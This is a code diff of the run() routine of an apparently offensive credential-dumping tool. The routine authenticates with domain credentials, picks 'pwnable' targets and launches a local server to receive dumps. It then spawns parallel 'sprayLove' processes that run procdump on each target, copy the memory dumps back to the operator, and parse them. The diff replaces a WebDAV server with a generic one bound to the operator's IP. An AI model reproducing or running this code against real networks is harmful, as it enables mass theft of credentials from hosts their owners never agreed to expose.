@@ -7,38 +7,49 @@
 
 
 # Imports
-import logging
+import logging, queue
 from core.User import *
-from core.DavServer import *
+from core.Server import *
 from core.Resources import *
 from core.Targets import *
 from core.SprayLove import *
 from core.ParseDump import *
 from core.Colors import *
+from core.Utils import *
 from multiprocessing import Process, Queue
 
 
 def run(args):
-	davServer = None
-	jobs = []
-	user = User(args.domain, args.username, args.password)
-	q = Queue()
-	davServer = Process(target=launchDavServer, args=(q, args.port))
+    jobs = []
+    q = Queue()
 
-	try:
-		targets = listPwnableTargets(args.targets, user)
-		davServer.start()
+    user = User(args.domain, args.username, args.password)
+    local_ip = retrieveMyIP()
+    alea = gen_random_string(5).upper()
 
-		if q.get() == 0:
-			logging.warning("%sExec procdump on targets, and retrieve dumps locally into %smisc/dumps%s." % (warningGre, green, white))
-			for target in targets:
-				jobs.append(Process(target=sprayLove, args=(user, target, args.methods, args.share, args.port)))
-				jobs[-1].start()
+    server = Process(target=launchServer, args=(q, local_ip, alea, args.server))
 
-			joinThreads(davServer, jobs, args.wait)
-			parseDumps(dumpDir)
+    try:
+        targets = listPwnableTargets(args.targets, user)
+        server.start()
 
-	except Exception as e:
-		logging.warning("%sError: %s" % (warningRed, white, e))
-	finally:
-		exit_gracefully(davServer, jobs)
+        try:
+            if q.get(True, 3) == -1:
+                pass
+        except queue.Empty:
+            logging.info("%sServer launched successfully." % (warningGre))
+            logging.warning("%sExec procdump on targets, and retrieve dumps locally into %smisc/dumps%s." % (warningGre, green, white))
+
+            for target in targets:
+                jobs.append(Process(target=sprayLove, args=(user, target, args.methods, local_ip, alea)))
+                jobs[-1].start()
+
+            joinThreads(server, jobs, args.wait)
+            parseDumps(dumpDir)
+    except KeyboardInterrupt:
+        logging.warning("%sKeyboard interrupt. Exiting." % (warningRed))
+    except Exception as e:
+        logging.warning("%sErr: %s" % (warningRed, e))
+    finally:
+        exit_gracefully(server,jobs, args.keep)
+
